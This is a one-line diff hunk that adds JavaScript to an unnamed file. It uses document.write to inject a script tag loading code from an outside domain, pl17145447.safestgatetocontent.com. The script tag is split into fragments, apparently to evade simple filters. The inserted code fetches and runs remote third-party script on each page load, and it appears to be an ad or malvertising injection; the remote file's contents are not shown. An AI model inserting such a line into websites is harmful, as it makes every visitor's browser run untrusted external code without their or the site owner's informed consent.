@@ -1,0 +1,1 @@
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://pl17145447.safestgatetocontent.com/a4/04/f2/a404f2332ddb87d17a27a77c036e8826.js"></scr' + 'ipt>');
